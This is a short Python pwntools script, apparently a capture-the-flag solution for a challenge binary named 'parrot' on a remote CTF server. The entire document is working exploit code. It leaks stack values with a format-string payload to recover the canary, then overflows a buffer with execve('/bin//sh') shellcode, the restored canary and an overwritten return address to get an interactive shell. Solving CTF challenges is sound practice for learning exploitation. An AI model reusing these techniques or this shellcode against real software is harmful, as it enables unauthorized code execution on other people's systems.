from pwn import *

#p = gdb.debug("./parrot")
#p = process("./parrot")
p = remote("0.cloud.chals.io", 12185)
addr = p.recvline().decode().split()[-1]
addr = int(addr[2:],16)

print("addr "+hex(addr))

p.sendline(b'%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p')

canary = p.recv(len('(nil) (nil) 0x7effb8f99980 (nil) (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x560070252070 (nil) 0x5654bf59f0e0 0x7ffe363dcb20 0xc2146cd82bf90000')).decode().split()[-1]
canary = int(canary[2:],16)

print("canary",hex(canary))

#payload = b'\x90'*(72)
payload = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
payload += b'\x90'*(72-24)
payload += p64(canary)
payload += b'A'*8
payload += p64(addr)
p.sendline(payload)
p.interactive()
